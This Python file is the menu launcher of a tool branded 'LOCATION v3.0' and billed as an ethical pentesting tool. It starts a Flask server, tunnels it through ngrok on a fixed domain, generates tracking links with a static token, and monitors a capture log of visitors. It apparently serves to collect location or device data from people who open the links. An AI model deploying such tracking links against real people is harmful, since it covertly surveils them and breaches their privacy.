import os
import sys
import json
import time
import requests
import threading
import datetime
from colorama import Fore, Style, init
from pyngrok import ngrok
from server import run_server

# Force UTF-8 encoding for Windows/Kali consoles to handle ASCII art
if sys.stdout.encoding != 'utf-8':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

# Initialize colored output
init(autoreset=True)

def check_dependencies():
    """Checks if required libraries are installed before starting."""
    required = ['flask', 'requests', 'pyngrok', 'colorama', 'user_agents', 'flask_cors']
    missing = []
    for lib in required:
        try:
            __import__(lib.replace('-', '_'))
        except ImportError:
            missing.append(lib)
    
    if missing:
        print(f"{Fore.RED}[!] MISSING DEPENDENCIES: {', '.join(missing)}")
        print(f"{Fore.YELLOW}[*] Run: pip3 install {' '.join(missing)} --break-system-packages")
        sys.exit(1)

def is_root():
    """Checks if the script is running with root privileges on Linux."""
    if os.name == 'nt': return True
    return os.geteuid() == 0

# Global State
STREAMS = {
    'server_thread': None,
    'public_url': None,
    'is_running': False
}

LINKS_FILE = "links.txt"
LOGS_DIR = "logs"

def get_timestamp():
    return datetime.datetime.now().strftime("[%H:%M:%S]")

def log_event(msg, type="INFO"):
    colors = {"INFO": Fore.CYAN, "SUCCESS": Fore.GREEN, "ERROR": Fore.RED, "WARN": Fore.YELLOW}
    print(f"{Fore.WHITE}{get_timestamp()} {colors.get(type, Fore.WHITE)}[{type}]{Style.RESET_ALL} {msg}")

def print_banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    banner = f"""
{Fore.CYAN}{Style.BRIGHT}
  ██╗      ██████╗  ██████╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
  ██║     ██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
  ██║     ██║   ██║██║     ███████║   ██║   ██║██║   ██║██╔██╗ ██║
  ██║     ██║   ██║██║     ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
  ███████╗╚██████╔╝╚██████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
  ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ v3.0
          {Fore.WHITE}ETHICAL PENTESTING TOOL • KALI LINUX EDITION
          {Fore.YELLOW}Education & Cybersecurity Awareness Only
    """
    print(banner)

def start_services(port=8080, use_custom=True):
    if STREAMS['is_running']:
        log_event("Services are already running.", "WARN")
        return

    domain = "badge-chevy-mongoose.ngrok-free.dev" if use_custom else None

    # AUTO-CLEANUP
    log_event("Optimizing host machine...", "INFO")
    try:
        ngrok.kill()
        if os.name != 'nt':
            cmd_prefix = "sudo " if is_root() else ""
            os.system(f"{cmd_prefix}fuser -k {port}/tcp > /dev/null 2>&1")
            os.system(f"{cmd_prefix}pkill -f ngrok > /dev/null 2>&1")
        else:
            os.system(f"for /f \"tokens=5\" %a in ('netstat -aon ^| findstr :{port}') do taskkill /F /PID %a >nul 2>&1")
            os.system("taskkill /F /IM ngrok.exe >nul 2>&1")
        log_event("Environment ready.", "SUCCESS")
    except:
        pass

    log_event(f"Launching Flask backend...", "INFO")
    STREAMS['server_thread'] = threading.Thread(target=run_server, args=(port, "logs/capture.json", True), daemon=True)
    STREAMS['server_thread'].start()
    time.sleep(1.5)

    log_event("Initializing ngrok tunnel...", "INFO")
    try:
        # ALWAYS kill existing sessions to prevent local conflict
        ngrok.kill()
        
        if domain:
            log_event(f"Attempting Advanced Pooling to {domain}...", "INFO")
            # pooling_enabled=True allows multiple sessions to share the same domain simultaneously
            tunnel = ngrok.connect(port, domain=domain, pooling_enabled=True)
        else:
            log_event("Starting with a fresh Random Link...", "INFO")
            tunnel = ngrok.connect(port)

        STREAMS['public_url'] = tunnel.public_url
        STREAMS['is_running'] = True
        log_event(f"Tunnel Online: {Fore.YELLOW}{STREAMS['public_url']}", "SUCCESS")
    except Exception as e:
        log_event(f"Ngrok Failure: {e}", "ERROR")
        log_event("Please ensure your authtoken is updated in Kali.", "WARN")

def generate_link():
    if not STREAMS['is_running']:
        log_event("You must start the server [Option 1] first!", "ERROR")
        return

    # Using the permanent static token
    token = "win-token-77"
    final_url = f"{STREAMS['public_url']}/?t={token}"
    
    log_event(f"Link Generated: {Fore.GREEN}{final_url}", "SUCCESS")
    
    # Save to links.txt
    with open(LINKS_FILE, "a") as f:
        f.write(f"{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | Token: {token} | URL: {final_url}\n")
    
    log_event(f"Saved to {LINKS_FILE}", "INFO")

def view_links():
    if not os.path.exists(LINKS_FILE):
        log_event("No links generated yet.", "WARN")
        return

    print(f"\n{Fore.YELLOW}{'='*60}")
    print(f"{Fore.WHITE} GENERATED LINKS HISTORY")
    print(f"{Fore.YELLOW}{'='*60}")
    with open(LINKS_FILE, "r") as f:
        print(f.read())
    print(f"{Fore.YELLOW}{'='*60}\n")

def shutdown():
    log_event("Shutting down services...", "INFO")
    ngrok.kill()
    log_event("Exiting. Happy Hacking!", "SUCCESS")
    sys.exit(0)

def main_menu():
    while True:
        print_banner()
        status = f"{Fore.GREEN}ONLINE" if STREAMS['is_running'] else f"{Fore.RED}OFFLINE"
        print(f" STATUS: {status} | LOGS: {LOGS_DIR}/")
        print("-" * 65)
        print(f" {Fore.CYAN}[1]{Fore.WHITE} Start Server & Tunnel")
        print(f" {Fore.CYAN}[2]{Fore.WHITE} Generate Sharable Link")
        print(f" {Fore.CYAN}[3]{Fore.WHITE} View Link History")
        print(f" {Fore.CYAN}[4]{Fore.WHITE} View Live Captures (capture.json)")
        print(f" {Fore.CYAN}[5]{Fore.WHITE} Shutdown & Exit")
        print("-" * 65)

        choice = input(f"{Fore.YELLOW}Select Option > {Style.RESET_ALL}")

        if choice == '1':
            print(f"\n {Fore.WHITE}TUNNEL_CONFIG:")
            print(f" {Fore.CYAN}[S]{Fore.WHITE} Static Professional Domain (badge-chevy-...)")
            print(f" {Fore.CYAN}[R]{Fore.WHITE} Random Guaranteed Link (Bypass 500 Errors)")
            t_choice = input(f"{Fore.YELLOW} Select Mode [S/R] > {Style.RESET_ALL}").strip().lower()
            
            use_custom = True if t_choice != 'r' else False
            log_event(f"Starting with {'Professional Domain' if use_custom else 'Random Link'}...", "INFO")
            start_services(use_custom=use_custom)
            input(f"\n{Fore.WHITE}Press Enter to return to menu...")
        elif choice == '2':
            generate_link()
            input(f"\n{Fore.WHITE}Press Enter to return to menu...")
        elif choice == '3':
            view_links()
            input(f"\n{Fore.WHITE}Press Enter to return to menu...")
        elif choice == '4':
            log_event("Entering Live Monitor Mode. Press CTRL+C to return to menu.", "INFO")
            time.sleep(1)
            if os.name != 'nt':
                os.system(f'tail -f {LOGS_DIR}/capture.json')
            else:
                os.system(f'powershell Get-Content {LOGS_DIR}/capture.json -Wait')
            input(f"\n{Fore.WHITE}Press Enter to return to menu...")
        elif choice == '5':
            shutdown()
        else:
            log_event("Invalid selection.", "ERROR")
            time.sleep(1)

if __name__ == "__main__":
    check_dependencies()
    try:
        main_menu()
    except KeyboardInterrupt:
        shutdown()
